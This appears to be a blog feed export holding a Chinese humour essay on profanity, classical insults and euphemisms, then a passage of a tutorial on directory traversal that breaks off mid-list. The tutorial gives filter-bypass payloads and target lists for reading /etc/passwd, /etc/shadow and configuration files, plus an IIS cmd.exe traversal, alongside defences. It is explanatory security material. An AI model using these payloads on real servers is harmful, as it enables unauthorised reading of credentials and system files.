      <url>2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>说话，是一门艺术。</p><h2 id="0x00-谈🐎"><a href="#0x00-谈🐎" class="headerlink" title="0x00 谈🐎"></a>0x00 谈🐎</h2><p>“汝母今恙否？”，问候对方的母亲，这是一种很亲切的问候，同时也是一种国骂，只是温文尔雅了一点，如果要通俗地来说，“你🐎si了”，“草尼🐎”可能更加适合于国人。</p><p>很喜欢谭总的一句骂，“嬲你妈妈别嘞”，很有韵味，越听越有意思。</p><hr><p>嬲（niǎo）：方言用字，很多时候用作脏词。通孬。在普通话中意为戏弄、搅扰，或纠缠之意。在内蒙古以及晋北方言中，意为：神气、得意，或志得意满之意。粤语中意为：生气。</p><hr><p>“嬲~”，“我嬲”，并不是用以骂人，多用于表示惊奇之感，比如“我嬲，这么屌的🐎？”，我们那一边的嬲读作<code>nia</code>，“我嬲de你li娘”，如此作为骂人的话。</p><p>这就是很神奇的一个地方，俗话说骂人不骂家人，那为甚么很多时候我们并不是直接骂对方“你是不是🐕啊，你是不是🐖啊”这一类的，而是直接上升到亲人呢，“你🐎今晚biss，buss不是亲🐎”这一类的。</p><p>可能是因为古代都有罪至株连九族，对方的行为已经足够可恨，令人过于不满，所以直接对对方的亲人进行攻击，会给人一种打出真实伤害的感觉，毕竟对方事情都做了，还会在乎你骂他吗。</p><p>还有一个很有意思的说法</p><hr><p>“拟妈死了”</p><p>我所骂的这个🐎并不真的就是你的🐎，而是我所创造出的一个虚拟的🐎，只是为了让我可以骂得更加痛快，但是虽然我现在这么骂着，但是平时日常生活中我见到了你的🐎我还是会亲切地喊一句“阿姨好”的。</p><hr><p>很天才，兄弟，这个词汇的创造真的是非常灵性，其实大家在对骂的时候并不是真的为了去诅咒对方“🐎死了”，而是为了通过骂对方的直系血缘关系的人，来使自己的气势达到一个更高的场合，来使自己在一场骂战中“取胜”。</p><p><del>好了，先到这里，下一次我们将品析一些不带脏字的骂人说法。（课设去了，逃</del></p><h2 id="0x01-优雅的古人"><a href="#0x01-优雅的古人" class="headerlink" title="0x01 优雅的古人"></a>0x01 优雅的古人</h2><p>不带脏字先姑且不谈，此刻的兴致停留在古人的优雅之间，我们来谈谈古人骂人的优雅之处。</p><p>有一说一奥，说脏话其实是检验友谊的重要标准，脏话越多，越亲密，因为脏话往往是表达感情的最直接途径，那么古人又是如何说脏话的呢？如若你只能说出“👴从未见过如此 厚颜无耻之人”，那确实应该好好学习一下了。</p><p>在秦汉时期，你会发现那个时代的人骂人还是很温和的，而且骂人需要一定的知识，因为当时书面语和口语比较接近。例如大家以前都学过的《鸿门宴》，项羽不听范增的劝告，放走了刘邦，急得范增大骂：“唉，竖子不足与谋！”意思就是“不想再跟你这个弱智玩了。”</p><p>当然也有更高级一点的，建安七子陈琳曾写《讨贼檄文》，痛骂曹操祖宗三代，听得曹操一愣一愣，你骂我可以理解，祖宗三代都骂了是什么操作，更骚的是把曹操当时的头风一下子治好了，这不是逆天我随你怎么说。</p><p>贴一波原文，👴甚是喜欢这文采</p><blockquote><p>盖闻明主图危以制变，忠臣虑难以立权。是以有非常之人，然后有非常之事；有非常之事，然后立非常之功。</p><p>夫非常者，固非常人所拟也。曩者，强秦弱主，赵高执柄，专制朝权，威福由己；时人迫胁，莫敢正言；终有望夷之败，祖宗焚灭，污辱至今，永为世鉴。及臻吕后季年，产禄专政，内兼二军，外统梁、赵；擅断万机，决事省禁；下陵上替，海内寒心。</p><p>于是绛侯朱虚兴兵奋怒，诛夷逆暴，尊立太宗，故能王道兴隆，光明显融：此则大臣立权之明表也。司空曹操：祖父中常侍腾，与左悺、徐璜并作妖孽，饕餮放横，伤化虐民；父嵩，乞匄携养，因赃假位，舆金辇璧，输货权门，窃盗鼎司，倾覆重器。操赘阉遗丑，本无懿德，犭票狡锋协，好乱乐祸。</p><p>幕府董统鹰扬，扫除凶逆；续遇董卓，侵官暴国。于是提剑挥鼓，发命东夏，收罗英雄，弃瑕取用；故遂与操同谘合谋，授以裨师，谓其鹰犬之才，爪牙可任。</p><p>至乃愚佻短略，轻进易退，伤夷折衄，数丧师徒；幕府辄复分兵命锐，修完补辑，表行东郡，领兖州刺史，被以虎文，奖戚威柄，冀获秦师一克之报。</p><p>而操遂承资跋扈，恣行凶忒，割剥元元，残贤害善。故九江太守边让，英才俊伟，天下知名；直言正色，论不阿谄；身首被枭悬之诛，妻孥受灰灭之咎。</p><p>自是士林愤痛，民怨弥重；一夫奋臂，举州同声。故躬破于徐方，地夺于吕布；彷徨东裔，蹈据无所。</p><p>幕府惟强干弱枝之义，且不登叛人之党，故复援旌擐甲，席卷起征，金鼓响振，布众奔沮；拯其死亡之患，复其方伯之位：则幕府无德于兖土之民，而有大造于操也。</p><p>后会銮驾返旆，群虏寇攻。时冀州方有北鄙之警，匪遑离局；故使从事中郎徐勋，就发遣操，使缮修郊庙，翊卫幼主。</p><p>操便放志：专行胁迁，当御省禁；卑侮王室，败法乱纪；坐领三台，专制朝政；爵赏由心，弄戮在口；所爱光五宗，所恶灭三族；群谈者受显诛，腹议者蒙隐戮；</p><p>百僚钳口，道路以目；尚书记朝会，公卿充员品而已故太尉杨彪，典历二司，享国极位。操因缘眦睚，被以非罪；榜楚参并，五毒备至；触情任忒，不顾宪纲。又议郎赵彦，忠谏直言，义有可纳，是以圣朝含听，改容加饰。</p><p>操欲迷夺时明，杜绝言路，擅收立杀，不俟报国。</p><p>又梁孝王，先帝母昆，坟陵尊显；桑梓松柏，犹宜肃恭。而操帅将吏士，亲临发掘，破棺裸尸，掠取金宝。至令圣朝流涕，士民伤怀！操又特置发丘中郎将、摸金校尉，所过隳突，无骸不露。</p><p>身处三公之位，而行桀虏之态，污国害民，毒施人鬼！加其细致惨苛，科防互设；罾缴充蹊，坑阱塞路；举手挂网罗，动足触机陷：是以兖、豫有无聊之民，帝都有吁嗟之怨。</p><p>历观载籍，无道之臣，贪残酷烈，于操为甚！幕府方诘外奸，未及整训；加绪含容，冀可弥缝。而操豺狼野心，潜包祸谋，乃欲摧挠栋梁，孤弱汉室，除灭忠正，专为袅雄。</p><p>往者伐鼓北征公孙瓒，强寇桀逆，拒围一年。操因其未破，阴交书命，外助王师，内相掩袭。会其行人发露，瓒亦枭夷，故使锋芒挫缩，厥图不果。今乃屯据敷仓，阻河为固，欲以螳螂之斧，御隆车之隧。</p><p>幕府奉汉威灵，折冲宇宙；长戟百万，胡骑千群；奋中黄育获之士，骋良弓劲弩之势；并州越太行，青州涉济漯；大军泛黄河而角其前，荆州下宛叶而掎其后：雷震虎步，若举炎火以焫飞蓬，覆沧海以沃[火票]炭，有何不灭者哉？</p><p>又操军吏士，其可战者，皆出自幽冀，或故营部曲，咸怨旷思归，流涕北顾。其余兖豫之民，及吕布张杨之余众，覆亡迫胁，权时苟从；各被创夷，人为仇敌。</p><p>若回旆方徂，登高冈而击鼓吹，扬素挥以启降路，必土崩瓦解，不俟血刃。方今汉室陵迟，纲维弛绝；圣朝无一介之辅，股肱无折冲之势。</p><p>方畿之内，简练之臣，皆垂头翼，莫所凭恃；虽有忠义之佐，胁于暴虐之臣，焉能展其节？又操持部曲精兵七百，围守宫阙，外托宿卫，内实拘执。惧其篡逆之萌，因斯而作。此乃忠臣肝脑涂地之秋，烈士立功之会，可不勖哉！</p><p>操又矫命称制，遣使发兵。恐边远州郡，过听给与，违众旅叛，举以丧名，为天下笑，则明哲不取也。即日幽并青冀四州并进。</p><p>书到荆州，便勒现兵，与建忠将军协同声势。州郡各整义兵，罗落境界，举武扬威，并匡社稷：则非常之功于是乎著。</p><p>其得操首者，封五千户侯，赏钱五千万。部曲偏裨将校诸吏降者，勿有所问。广宜恩信，班扬符赏，布告天下，咸使知圣朝有拘迫之难。如律令！</p></blockquote><p>这不是大才子？最骚的还在这里：<code>司空曹操：祖父中常侍腾，与左悺、徐璜并作妖孽，饕餮放横，伤化虐民；父嵩，乞匄携养，因赃假位，舆金辇璧，输货权门，窃盗鼎司，倾覆重器。操赘阉遗丑，本无懿德，犭票狡锋协，好乱乐祸。</code>，直接是从祖宗十八代骂了曹操一家，还骂他爹是太监，曹操倒也宽容大度，后来逮住了陈琳，还笑着对他说：“你的说法就很有问题，要是我爸是太监的话，我是怎么生下来的呢”，也没杀陈琳，让陈琳下去做写文章的人了。</p><p>再到了唐宋元时期，就有了更多可骂的词汇了，经过了秦汉的发展，唐宋元脏话进一步向今天靠拢。举个栗子，《资治通鉴》中记载，安西节度使夫蒙灵察大骂高仙芝：“啖狗粪高丽奴！”（吃狗屎吧高丽棒子（食屎啦你，吔屎啦梁非凡）），混杂了当时的各种流行技巧，如民族歧视、人格鄙视、动物类比等，代表了唐朝骂人的上等水平。</p><p>被誉为千古一帝的唐宗宋祖，脏话也照说不误，唐太宗曾被魏征的进谏惹怒，跑回去跟老婆哭诉：“会需杀此田舍翁！”（总有一天要杀了这个乡巴佬）。宋太祖寝室房梁损坏，需要更换，大臣奏报要截根巨木当房梁，太祖在折子上批：“截你爷头，截你娘头。”（截你爸的头，截你妈的头），当时的人不禁纷纷称赞，认为充分表现了太祖的爱物之心。</p><p>而想要了解宋元的民间脏话，当然不得不看国骂宝典《水浒传》，以骂街达人鲁智深为例，说话几乎没有不带脏字的：“直娘贼！还敢应口”，“你两个撮鸟”，“这厮们挟着屁眼撒开”。白话中夹带着文言，粗俗中透露一丝文趣（误），完美表现了花和尚豁达直爽的性格，让人听了畅快淋漓（大误）。</p><p>这会儿到了明清时期，恭喜你，可能之前你觉得，贼、这厮、腌臜等，仍然不够劲爆，那么明清则进一步地，将脏话集中到下半身，以及下半身的动作，与今天非常接近，太尼娘带劲辣。不过《大明律》和《大清律》中规定，骂人是犯罪行为，轻者打屁股、重者流放，所以骂人有一定风险。连文人叫骂也粗俗了许多，比如明朝文豪王世贞，贵为“后七子”之首，在diss别人的诗词时，也使用了粗鄙之语：“此等语，何不以溺自照？”，用今天的话说就是：“你写的是什么鬼，怎么不撒泡尿照照自己？”。号称封建社会百科全书的《红楼梦》，里面的骂人艺术甚至完爆了现代，比如第四十六回，鸳鸯骂嫂子：“你快夹着屄嘴离了这里，好多着呢！什么‘好话’！宋徽宗的鹰，赵子昂的马，都是好画（话）儿。什么‘喜事’！状元痘儿灌的浆儿又满是喜事！怪道成日家羡慕人家女儿做了小老婆了，一家子都仗着他横行霸道的，一家子都成了小老婆了！看的眼热了，也把我送在火坑里去。”，盛怒之下，不仅出口成脏，还不忘用典，前半句一语双关，后半句谐音用典，还是出自一位娇滴滴，尚未出嫁的小姐姐之口。（贾赦看上了贾母跟前的贴身丫环鸳鸯，贪恋美色的贾赦先派邢夫人前去传话，没什么进展，于是后来又叫鸳鸯的嫂嫂说亲，一心想攀龙附凤向上爬的嫂嫂不仅没有做好媒，本想着一飞冲天，结果呢，人生不如意之事十之八九，性格刚烈的鸳鸯直接给不知天高地厚的嫂嫂一顿好骂！闹的她灰头土脸的。）</p><p>一般而言，脏话不外乎这几个方面，性、动物、恶心、地位、人格、血统，所以脏话想令人耳目一新，必须多面结合，层层递进。比如《水浒传》王婆骂郓哥：“含鸟猢狲！”又如《金瓶梅》吴月娘痛骂bitch：“贼狗攮的养汉的淫妇！”都是很好的成功案例。</p><p>相信看到这里，大家对古代脏话，以及骂人的高级技巧，已经有了一定理解，不妨试做例题：</p><hr><p>如何说一句，惊天地泣鬼神的脏话？</p><p>参考答案：</p><p>明末清初长篇小说《醒世姻缘传》第十一回：“放你家那臭私窠子淫妇歪拉骨接万人的大开门驴子狗臭屁！”</p><hr><p>再然后呢，就是现代辣，现代呢</p><p><img src="https://i.loli.net/2021/04/25/qxDQHdNh3Xtu1jV.jpg"></p><p><del>彳亍，这一次就谈这么多了，下次谈谈我正好想谈的，虽然暂时还不知道想谈啥，但是这玩意儿可比课设有意思多了</del></p><h2 id="0x02-Chinese的委婉艺术"><a href="#0x02-Chinese的委婉艺术" class="headerlink" title="0x02 Chinese的委婉艺术"></a>0x02 Chinese的委婉艺术</h2><p><strong>“你是个好人”</strong>，<strong>“我们还是做朋友吧”</strong>，<strong>“我们不太合适，你会遇到更好的”</strong>，不知道在座的hxd有多少人听过这些话，确实大家都是明白人，这么一说也就明白了，欸，凉了，黄了黄了，找下一个吧，xsl，但是总好过被直接挑明是不是，“我对你没有感觉”，“爬，👵不喜欢你个脑瘫”，“我以为你只是我朋友而已，我其实也不喜欢你”，对不对，内容太过扎心，引起极度不适。</p><p>再说点真实的，你和你的女神聊着聊着，你女神突然来了一句：“👵洗澡去了”，然后你期待地坐在桌前拿着手机痴笑，等了个三个小时，室友们都睡着好久了，鼾声在寝室里回荡着，天地间彷佛只存在你个撒比，甚至你可能还在幻想着女神洗完了澡给你打个视频电话过来，然后问你她好不好看（“扑哧”，来自屏幕另一端的无情嗤笑）</p><p>那这哥们确实也是不懂味嗷，如果想和你聊的话或者说觉得和你聊天有意思，人家肯定第一时间就来找你了，是不是，你总不希望听到“👵不想和你个矬逼屌丝聊了，👵要去找👵喜欢的👴了，爬吧”这样的话吧，那也太没味了，而且别人也肯定不愿意去挑明这种玩意，多没意思，自己心里有B数就好辣。</p><p>生活中有许多事情是只需意会，不必言传的，古人也曾说过“言有尽而意无穷，余意尽在不方中”，讲个笑话：</p><blockquote><p>从前，有个酒店老板，脾气非常暴躁。一天，有个客人来喝酒，才喝了一口，嘴里便叫：“好酸！好酸！”老板听后大怒，不由分说，把客人绑起来，吊在屋梁上。这时来了另一位顾客，问老板为什么吊人，老板回答：“我店的酒明明香醇甜美，这家伙硬说是酸的，你说该不该吊人？”来客说：“可不可让我尝尝？”老板殷勤地给他端了一杯酒，客人呷了一口，酸得皱眉眯眼，对老板说：“你放下这个人，把我吊起来吧？”这位客人委婉含蓄的说法，既收到强烈的讽刺效果，又显得非常艺术。</p></blockquote><p>“予谓菊，花之隐逸者也”，只一句，北宋周敦颐就将菊花等同于古代隐士。不食人间烟火，高冷范儿，妥妥的，全是菊花好。而今，新新人类利用他们庞大的脑洞，将这些词汇的含义进行了引申。“留图不留种，菊花万人捅”。👴踏马笑得菊花都松了……从此，世风日下，菊花不在。再回首，读到“菊之爱，陶后鲜有闻。”，当时便虎躯一震，似乎明白了什么。（误）</p><p>《口技》，又是大家都学过的：“遥闻深巷犬吠声，便有妇人惊觉欠伸，摇其夫语猥亵事。夫呓语，初不甚应，妇摇之不止，则二人语渐间杂，床又从中戛戛。”，从中戛戛，哈哈哈！</p><p>再来谈点奇♂怪的东西吧，老祖宗造字有个规矩，简单粗暴。简单怎么说呢？会意法造字，让人一目了然，比如“休”，人靠树所谓休息；再比如“囚”，人困于口所谓囚；又像“尖”，上小下大为尖，都很生动形象。粗暴呢，我们可以看一看这个字——“肏”（cao），上入，下🥩，含义就是进入到肉里面去，仅从字形就暴露出 sexual intercourse 的本质，《红楼梦》中有个经典桥段：“只见炕上那人笑道：‘瑞大叔要肏我呢！’”。当然呢，还有“挊”（nong），用手上下摩擦某根玩意，仔细想想这不就是撸嘛，其实它本来的意思也正是男性自我安慰。</p><p>这俩字挺逆天的，达到了会意的最高境界，所以它们也被屏蔽掉了，不过呢，尽管失去了这俩字，我们还发明了“艹”“操”“撸”“干”“弄”“日”“插”等字词，它们也成功地取代了前者，成为了它们的委婉用法，不过第一次看见“肏”和“挊”，应该多半是一脸懵逼的，实际上我们会更加乐意使用后者，“X你祖宗！”。</p><p>原因其实很简单，毕竟“肏”和“挊”两个字太过于形象生动，反而提不起中国人的兴趣，因为越是形象生动的字词，越是没有联想空间；越没有联想空间，就越不骚气与浪漫。比如北方俗语的“干天，操地，日太阳”，默念三遍，幻肢已硬！若变成了“肏天，肏地，肏太阳”，大哥能不能换个词？！表达太单调啊。</p><p>而且“肏”，“挊”两字太过赤裸，从风花雪月到真枪实干的这一步骤，如若你用这俩词，233333是不是怪怪的，或许这就是委婉的魅力吧，越是无限委婉，越是显得污力滔滔，传进千家万户……当然，普通的委婉语并不能让你成为把妹高手。满嘴“菊花”“黄瓜”“木耳”只会让你更加猥琐。</p><p>具有高级感的委婉语可遇不可求，这个要像老祖宗学习。首先要会做梦，梦感要极强！最好能令人浮想联翩。战国时宋玉的《高唐赋》有言：</p><hr><p>昔者先王梦见一妇人曰：妾，巫山之女也，愿荐枕席。</p><p>先王问：你干嘛的？我可不是随便的人</p><p>妇人答：妾旦为朝云，暮为行雨。</p><hr><p>于是先王睡了一个晨变云朵，晚变烟雨的女子。他们睡的过程就被大家粗暴地认为是“巫山云雨”。“巫山”“云雨”两个词贴切啊！巫山云雨是床笫之欢。曹雪芹在《红楼梦》第六回“宝玉初试云雨情”中写的就是贾宝玉与丫环袭人房事之时的情景，但此处贾宝玉携袭人行房事有没有那啥那啥那啥那啥那啥快乐咱们就不得而知了。</p><p>其次要会联想，颠鸾倒凤，鸾是神鸟，凤就是凤凰。颠鸾倒凤的本意比喻颠倒次序。如果将颠鸾倒凤用于人身上，就有了男女交欢之意。元代王实甫《西厢记》第四本第二折中有：“你绣帷里效绸缪，颠鸾倒凤百事有”的记载，《红楼梦》第六十五回也有“是夜，贾琏和他颠鸾倒凤，百般恩爱”。姿势很丰富嘛。用现在的话来说，就是6️⃣9️⃣。一提6️⃣9️⃣，老司机会心一笑，颠鸾倒凤就显得更加耐人寻味。</p><p>说到内涵，元朝王实甫在《西厢记》中的另外一个词语——鱼水之欢更加有内涵。鱼和水的故事最早出自于名著《三国演义》中，刘备对诸葛亮的评语就是：吾得孔明，犹鱼之得水也。形容融洽的合作伴侣的关系。当合作伴侣变为男人和女人的时候，“如鱼得水”也就演变成为了“鱼水之欢”。这类词还有很多，“于飞之愿”“云朝雨暮”“管鲍之交”……（用的开心，才是真的好~）</p><p>你喜欢“make love”，👴喜欢“朝云暮雨”，你喜欢“约吗？”，👴喜欢“花明月暗笼轻雾，今宵好向郎边去”。中文的博大精深在委婉这里也真是体现得淋漓尽致，比起一丝不挂，我们更喜欢浴霸还休（bushi</p><p>说来，你去医院可以直接用“菊花”这个词汇来表达，医生都能够分分钟理解你的含义。不过，别指望这个词汇会出现在你的病历上，医生可没有你那么幽默。说到医院和医生，我们再来聊聊别的，刚才似乎开🚗开过头了，咳咳。</p><p>不扯远了，我们继续回到话题，虽然说生老病死是人间常态，但是对于死这个字，人们还是很有忌讳的，从古至今，人们都在寻找可以替代死字的词汇或者是说法，比如：</p><hr><p>亡、故、卒、弱、逝、殁、殪、毙、殂、徂、殒、薨、死亡、丧亡、亡故、身故、物故、物化、去世、逝世、弃世、过世、下世、就世、谢世、凋谢、死灭、毙命、毕命、殒命、殒灭、捐背、捐馆、殂落、徂落、殂谢、徂谢、迁化、怛化、疾终、长逝、永诀、永别、永眠、长眠、就木、故去、溘逝、溘死、断气、咽气、合眼、闭眼、没了、挺腿、完蛋、呜呼、回老家、玩儿完、翘辫子、上西天、见阎王、登鬼录、填沟壑、粉身碎骨、见马克思、与世长辞、溘然长逝、寿终正寝、命赴黄泉、呜呼哀哉、一命呜呼、天夺其魄、仙逝、仙游、千古、作古、归西、归天、大故、不在、过去、不禄、不讳、不可讳、跨鹤西游、千秋之后、百年之合、三长两短、山高水低、见背、弃养、牺牲、舍身、献身、就义、捐躯、捐生、殉职、殉国、殉难、殉节、殉、效死、效命、授命、阵亡、成仁、杀身成仁、舍生取义、以身许国、马革裹尸、肝脑（胆）涂地、横死、强死、凶死、丧命、送命、毙命、暴卒、倒头、死于非命、饿死、殣、升天、涅盘、坐化、羽化、鹤化、物化、圆寂、归寂、示寂、入寂、入灭、灭度、示灭、尸解、崩、驾崩、山陵崩、晏驾、升遐、登遐、宾天、大行、千秋万岁、夭折、夭亡、短折、早世、早逝、早死、中殇、殇、兰摧玉折、玉楼赴召、玉楼修记、地下修文、葬玉埋香、玉殒香消、香消玉殒、借女离魂、客死、瘐死</p><hr><p>这么一列，愈发感觉人们为了避讳能有多强的创造能力。（当然，这些只是用以水字数的，我是什么人）</p><p>学习之余随便侃侃这些感觉巨鸡儿👍，放松心情，令人神清气爽，好像鸽了<code>不带脏字的骂人说法</code>两回了，下次继续🕊，溜</p><h2 id="0x03-对嘲讽的一点思考"><a href="#0x03-对嘲讽的一点思考" class="headerlink" title="0x03 对嘲讽的一点思考"></a>0x03 对嘲讽的一点思考</h2><p>以前和朋友一起看别人吃鸡，只能说那个人的操作用来就饭我可以连吃四碗不带喝水，而我朋友则用了一句很有意思的话来形容他的操作，令我现在回想起来，细细一琢磨，越想越乐呵，于是有了这篇文章——“我奶奶推着轮椅都可以从你狙镜下过去”。何其尖酸刻薄，何其一阵见血，这一类狭义的嘲讽和无脑喷远远不同，其往往诙谐幽默而又直指真相，在博人一笑的同时也毫不留情地揭开他人的遮羞布。</p>]]></content>
      
      
      <categories>
          
          <category> 瞎BB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈目录穿越</title>
      <link href="2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
      <url>2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>目录遍历（目录穿越）是一个Web安全漏洞，攻击者可以利用该漏洞读取运行应用程序的服务器上的任意文件。 这可能包括应用程序代码和数据，后端系统的登录信息以及敏感的操作系统文件</p><p>在某些情况下，攻击者可能能够在服务器上写入任意文件，（如，FFFTP 是一款小型的 FTP 客户端软件。FFFTP客户端没有正确地验证 FTP 服务器所返回的 LIST 命令响应中包含有目录遍历序列（斜线）的文件名，如果用户受骗从恶意的 FTP 服务器下载的目录包含有带有恶意文件名的文件的话，就可能导致向用户系统的任意位置写入文件）从而允许他们修改应用程序数据或行为，并最终完全控制服务器</p><h2 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h2><h3 id="0x00-基础目录遍历"><a href="#0x00-基础目录遍历" class="headerlink" title="0x00 基础目录遍历"></a>0x00 基础目录遍历</h3><p>直接利用 ../ 返回上一级来遍历任意文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x01-绝对路径"><a href="#0x01-绝对路径" class="headerlink" title="0x01 绝对路径"></a>0x01 绝对路径</h3><p>web网站有时候会采取目录遍历的防御措施，如过滤 ../ 上一级等关键字，然后简单的过滤通常会被绕过。有时候可以直接采用绝对路径，无须 ../ 返回上一级目录遍历</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x02-双写-绕过"><a href="#0x02-双写-绕过" class="headerlink" title="0x02 双写../绕过"></a>0x02 双写../绕过</h3><p>有时候，防御措施是直接将 ../ 替换为空，可以直接采用双写直接绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x03-URL编码绕过"><a href="#0x03-URL编码绕过" class="headerlink" title="0x03 URL编码绕过"></a>0x03 URL编码绕过</h3><p>也可以采用 URL 编码来绕过服务器对 . 或者 / 的检测</p><blockquote><p>.  =&gt; %2c</p><p>/  =&gt; %2f</p><p>% =&gt; %25 (双重URL编码)</p></blockquote><h3 id="0x04-绝对路径配合"><a href="#0x04-绝对路径配合" class="headerlink" title="0x04 绝对路径配合 ../"></a>0x04 绝对路径配合 ../</h3><p>有些 web 在获取文件时，会首先判断是否以一个固定的路径开头</p><p>那么就可以配合 ../ 来返回上一级遍历任意文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x05-截断文件后缀"><a href="#0x05-截断文件后缀" class="headerlink" title="0x05 截断文件后缀"></a>0x05 截断文件后缀</h3><p>某些 web 对文件类型作了限制，只有当后缀为图片时才解析</p><p>这时候就可以利用 %00 来截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00.jpg</span><br></pre></td></tr></table></figure><h3 id="0x0x"><a href="#0x0x" class="headerlink" title="0x0x"></a>0x0x</h3><p>要读取根目录下的文件的话 ../ 可以随意拼接任意个，就像 ../../../../../../../../../../../../../../../../../../../../../../</p><p>因为到了根目录再返回上级目录依然是根目录</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>防止文件路径遍历漏洞的最有效方法是避免将用户提供的输入完全传递给文件系统API</p><p>如果认为不可避免的是将用户提供的输入传递给文件系统 API，则应同时使用两层防御，以防止受到攻击：</p><blockquote><ul><li>应用程序应在处理之前验证用户输入。理想情况下，验证应与允许值的白名单进行比较。如果所需的功能无法做到这一点，则验证应验证输入内容仅包含允许的内容，例如纯字母数字字符</li><li>验证提供的输入后，应用程序应将输入附加到基本目录，并使用平台文件系统 API 规范化路径。验证规范化路径以预期的基本目录开头</li></ul></blockquote><h2 id="攻击路径整理"><a href="#攻击路径整理" class="headerlink" title="攻击路径整理"></a>攻击路径整理</h2><h3 id="文件整理"><a href="#文件整理" class="headerlink" title="文件整理"></a>文件整理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc\hosts #Win10</span><br><span class="line">C:\boot.int  #Win7 隐藏文件</span><br><span class="line">web.xml  #Java Web项目配置文件  </span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">C:\Program Files\mysql\my.ini  #Mysql下配置文件</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;.htaccess</span><br><span class="line">&#x2F;phpinfo.php</span><br><span class="line">&#x2F;inc&#x2F;db.php</span><br><span class="line">&#x2F;inc&#x2F;conn.php</span><br><span class="line">&#x2F;Windows&#x2F;system.ini</span><br><span class="line"></span><br><span class="line"># Tomcat</span><br><span class="line">&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># Windows + IIS + asp</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;scripts&#x2F;..%5c..&#x2F;Windows&#x2F;System32&#x2F;cmd.exe?&#x2F;c+dir+c:\  # 老版本 - IIS CGI文件名解码漏洞</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;show.asp?view&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Windows&#x2F;system.ini</span><br></pre></td></tr></table></figure><h3 id="路径整理"><a href="#路径整理" class="headerlink" title="路径整理"></a>路径整理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span 